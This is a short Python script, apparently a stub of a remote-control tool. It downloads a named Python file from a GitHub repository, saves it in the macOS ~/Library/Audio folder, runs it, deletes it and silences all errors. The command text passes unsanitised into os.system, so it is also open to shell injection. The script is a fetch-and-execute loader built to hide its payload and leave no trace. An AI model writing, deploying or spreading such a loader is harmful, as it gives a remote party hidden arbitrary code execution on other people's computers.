import os

GITHUB_URL = "https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main"

cmd = "/out hello"

cmd = cmd[1:]
args = cmd.split(" ")
try:
    os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{cmd}.py -o ~/Library/Audio/{cmd}.py")
    os.system(f"python3 ~/Library/Audio/{cmd}.py {' '.join(args[1:])}")
    os.system(f"rm ~/Library/Audio/{cmd}.py")
except:
    pass